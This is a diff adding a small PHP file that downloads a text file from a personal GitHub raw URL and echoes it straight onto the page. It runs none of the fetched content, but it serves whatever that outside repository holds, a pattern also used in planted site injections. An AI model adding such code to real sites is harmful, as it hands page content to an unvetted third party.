@@ -1,0 +1,10 @@
+<?php
+$url = "https://raw.githubusercontent.com/laylamasruro06-lab/script/refs/heads/main/zertia-iso.txt";
+$content = file_get_contents($url);
+
+if ($content === FALSE) {
+    echo "Failed to fetch URL.";
+} else {
+    echo $content; // prints the webpage HTML
+}
+?>
